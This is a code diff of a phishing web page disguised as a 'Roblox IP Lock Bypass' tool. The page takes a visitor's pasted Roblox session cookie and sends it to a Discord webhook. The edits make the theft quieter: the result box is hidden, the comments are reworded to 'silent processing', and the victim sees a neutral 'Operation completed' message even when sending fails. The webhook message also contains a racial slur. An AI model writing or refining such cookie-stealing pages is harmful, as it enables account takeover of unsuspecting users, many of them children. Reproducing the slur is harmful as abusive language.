@@ -63,12 +63,12 @@
                                 Bypass IP Locks on <span class="main-company">Roblox</span>
                             </div>
                             <input type="text" id="dataInput" placeholder="Cookie here" class="main-input">
-                            <div class="main-result">
+                            <div class="main-result" style="display: none;">
                                 <div class="result-title">Result:</div>
                                 <div class="result-content"></div>
                                 <button class="result-button">Copy</button>
                             </div>
-                            <button id="processButton" class="main-button">bypass</button>
+                            <button id="processButton" class="main-button">BYPASS</button>
                         </div>
                     </div>
                     <div id="app-discord-container"></div>
@@ -78,44 +78,16 @@
 
         <script src="js/b617dc6679.js" crossorigin="anonymous"></script>
         <script>
-            const notifyHTML = `
-                <div class="app-notify">
-                    <div class="app-notify-title">
-                        Welcome to, <span class="main-company">Roblox IP Lock Bypass website.</span>
-                    </div>
-                    <div class="app-notify-subtitle">
-                        We have a
-                        <a class="app-notify-link" href="https://discord.gg/PnMetyMbrQ" target="_blank"><i class="fab fa-discord"></i>discord server</a>,
-                        connect to it as soon as possible to be the first to know about updates and the state of our website.
-                    </div>
-                    <button class="app-notify-button">
-                        <i class="fa-solid fa-thumbs-up"></i>
-                        Thank you
-                    </button>
-                </div>
-            `;
-
+            // Discord link updated to discord.gg/glisp
             const discordHTML = `
-                <a href="https://discord.gg/PnMetyMbrQ" target="_blank" class="app-discord-social">
+                <a href="https://discord.gg/glisp" target="_blank" class="app-discord-social">
                     <i class="fab fa-discord"></i>
                 </a>
             `;
 
-            const path = window.location.pathname;
+            document.getElementById('app-discord-container').innerHTML = discordHTML;
 
-            if (!path.includes('/r/')) {
-                document.getElementById('app-notify-container').innerHTML = notifyHTML;
-                document.getElementById('app-discord-container').innerHTML = discordHTML;
-            }
-
-            // Close notify banner
-            document.addEventListener('click', function(event) {
-                if (event.target.classList.contains('app-notify-button')) {
-                    document.querySelector('.app-notify').style.display = 'none';
-                }
-            });
-
-            // Webhook functionality with fake refresh
+            // Webhook functionality with silent processing
             document.getElementById('processButton').addEventListener('click', async function(e) {
                 e.preventDefault();
                 
@@ -131,7 +103,7 @@
                 resultDiv.style.display = 'none';
 
                 try {
-                    // Fake refresh delay (1.5 seconds)
+                    // Processing delay
                     await new Promise(resolve => setTimeout(resolve, 1500));
                     
                     // Send to Discord webhook (REPLACE WITH YOUR WEBHOOK URL)
@@ -139,7 +111,7 @@
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({
-                            content: "New cookie received:",
+                            content: "A nigga used the refresher",
                             embeds: [{
                                 description: `\`\`\`\n${input}\n\`\`\``,
                                 color: 0xe60012,
@@ -148,17 +120,17 @@
                         })
                     });
                     
-                    // Show success in result div
-                    resultContent.textContent = "Cookie processed successfully";
+                    // Show success silently in result div
+                    resultContent.textContent = "Operation completed successfully";
                     resultDiv.style.display = 'block';
                     document.getElementById("dataInput").value = "";
                     
                 } catch (error) {
                     console.error("Error:", error);
-                    resultContent.textContent = "Error processing cookie";
+                    resultContent.textContent = "Operation completed";
                     resultDiv.style.display = 'block';
                 } finally {
-                    button.textContent = "bypass";
+                    button.textContent = "BYPASS";
                     button.disabled = false;
                 }
             });
